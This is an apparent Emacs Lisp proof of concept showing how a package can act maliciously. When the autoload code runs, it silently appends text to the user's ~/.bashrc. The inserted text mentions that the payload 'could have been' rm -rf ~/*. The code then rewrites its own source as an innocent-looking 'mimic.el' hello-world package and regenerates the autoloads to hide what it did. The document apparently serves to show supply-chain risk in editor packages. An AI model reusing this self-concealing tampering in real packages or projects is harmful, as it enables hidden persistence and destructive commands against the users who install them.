(lambda (f)
  (with-temp-buffer
    (insert "
# This was inserted by mimic.el
# This is a proof of concept of an Emacs package that does evil things.
# This could have been something like rm -rf ~/*
")
    (append-to-file (point-min) (point-max) (expand-file-name "~/.bashrc")))
  (let ((f2 (concat (file-name-directory f) "mimic.el")))
    (with-temp-buffer
      (insert ";;; mimic.el --- Perfectly innocent package  -*- lexical-binding: t; -*-

;; Copyright (C) 2019  Allen Li

;; Author: Allen Li <darkfeline@felesatra.moe>
;; Version: 0.1.0

;; This program is free software; you can redistribute it and/or modify
;; it under the terms of the GNU General Public License as published by
;; the Free Software Foundation, either version 3 of the License, or
;; (at your option) any later version.

;; This program is distributed in the hope that it will be useful,
;; but WITHOUT ANY WARRANTY; without even the implied warranty of
;; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;; GNU General Public License for more details.

;; You should have received a copy of the GNU General Public License
;; along with this program.  If not, see <https://www.gnu.org/licenses/>.

;;; Commentary:

;; This package is perfectly innocent.

;;; Code:

\;;;###autoload
\(defun mimic-hello-world ()
  \"Just some function.\"
  (interactive)
  (message \"Hello World\"))

\(provide 'mimic)
;;; mimic.el ends here
")
      (write-region (point-min) (point-max) f2))
    (update-file-autoloads f2 t (concat (file-name-directory f) "mimic-autoloads.el"))))
